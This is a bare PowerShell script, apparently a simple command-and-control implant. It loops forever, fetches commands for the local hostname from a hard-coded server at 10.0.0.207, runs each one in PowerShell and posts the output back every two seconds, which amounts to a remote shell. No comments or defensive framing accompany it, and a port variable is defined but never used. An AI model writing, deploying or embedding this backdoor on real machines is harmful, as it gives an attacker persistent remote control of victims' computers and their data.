while ($true) {
    $server = "10.0.0.207"
    $port = "8084"
    $hostname = $env:COMPUTERNAME

    $cmd = Invoke-RestMethod "$server/command/$hostname"
    if ($cmd) {
        try {
            $output = powershell -Command $cmd | Out-String
        } catch {
            $output = "Error: $_"
        }

        $json = @{output = $output} | ConvertTo-Json
        Invoke-RestMethod "$server/result/$hostname" -Method POST -Body $json -ContentType "application/json"
    }

    Start-Sleep -Seconds 2
}
